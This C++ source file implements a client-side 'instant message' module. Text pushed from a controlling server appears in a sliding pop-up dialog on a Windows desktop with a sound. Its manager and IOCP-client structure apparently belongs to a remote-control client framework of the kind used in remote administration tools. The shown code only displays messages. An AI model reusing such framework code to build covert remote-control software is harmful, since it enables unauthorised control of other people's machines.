#include "stdafx.h"
#include "resource.h"


#include <tchar.h>
#include <mmsystem.h>
#pragma comment (lib,"WinMM.lib")

#include "InstanceMessage.h"


extern HINSTANCE __hInstance;

TCHAR __BufferData[0x1000] = { 0 };

int __TimeEvent = 0;
CIOCPClient* __IOCPClient = NULL;

CClientInstantManager::CClientInstantManager(CIOCPClient *ClientOB) : CManager(ClientOB)
{
	_tprintf(_T("Chatting...\r\n"));
	BYTE IsToken = CLIENT_INSTANT_MESSAGE_REPLY;
	_M_IOCPClient->OnServerSending((char*)&IsToken, sizeof(BYTE));

	__IOCPClient = _M_IOCPClient;

	WaitForServerDialogOpen();

}

CClientInstantManager::~CClientInstantManager()
{
	_tprintf(_T("Chatting over\r\n"));
}


VOID CClientInstantManager::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();
		break;
	}
	default:
	{
		memcpy(__BufferData, BufferData, BufferLength);
		//
		//
		
		DialogBox(__hInstance, MAKEINTRESOURCE(IDD_DIALOG_INSTANT_MESSAGE), NULL, _DialogProc);
		break;
	}
	}

	return;
}

VOID OnInitDialog(HWND DlgHwnd)
{
	MoveWindow(DlgHwnd, 0, 0, 0, 0, TRUE);

	SetDlgItemText(DlgHwnd, IDC_EDIT_INSTANT_MESSAGE,__BufferData);

	memset(__BufferData, 0, sizeof(__BufferData));

	__TimeEvent = ID_TIMER_POP_WINDOW;
	SetTimer(DlgHwnd, __TimeEvent, 1, NULL);

	PlaySound(MAKEINTRESOURCE(IDR_WAVE_INSTANT_MESSAGE),
		__hInstance, SND_ASYNC | SND_RESOURCE | SND_NODEFAULT);
	
	return;
}

VOID OnTimerDialog(HWND DlgHwnd)
{
	RECT Rect;
	static int Height = 0;
	SystemParametersInfo(SPI_GETWORKAREA, 0, &Rect, 0);
	int y = Rect.bottom - Rect.top;

	int x = 0;
	switch (__TimeEvent)
	{
	case ID_TIMER_CLOSE_WINDOW:
	{

		if (Height >= 0) {
			Height -= 5;
			MoveWindow(DlgHwnd, x, y - Height, WIN_WIDTH, Height, TRUE);
		}
		else {
			KillTimer(DlgHwnd, ID_TIMER_CLOSE_WINDOW);
			// 消息框过程完成, 可继续正常发送消息
			// BYTE IsToken = CLIENT_INSTANT_MESSAGE_COMPLETE;
			// __IOCPClient->OnServerSending((char*)&IsToken, sizeof(BYTE));
			EndDialog(DlgHwnd, 0);
		}
		break;
	}
	case ID_TIMER_DELAY_DISPLAY:
	{
		KillTimer(DlgHwnd, ID_TIMER_DELAY_DISPLAY);
		__TimeEvent = ID_TIMER_CLOSE_WINDOW;
		SetTimer(DlgHwnd, __TimeEvent, 5, NULL);
		break;
	}

	case ID_TIMER_POP_WINDOW:
	{
		if (Height <= WIN_HEIGHT) {
			Height += 3;
			MoveWindow(DlgHwnd, x, y - Height, WIN_HEIGHT, Height, TRUE);	
		}
		else {
			KillTimer(DlgHwnd, ID_TIMER_POP_WINDOW);
			__TimeEvent = ID_TIMER_DELAY_DISPLAY;
			SetTimer(DlgHwnd, __TimeEvent, 7000, NULL);
		}
		break;
	}
	}

	return;
}

INT_PTR CALLBACK _DialogProc(HWND DlgHwnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	switch (Msg)
	{
	case WM_TIMER:
	{
		OnTimerDialog(DlgHwnd);
		break;
	}
	case WM_INITDIALOG:
	{
		OnInitDialog(DlgHwnd);
		break;
	}
	default:
		break;
	}

	return 0;
}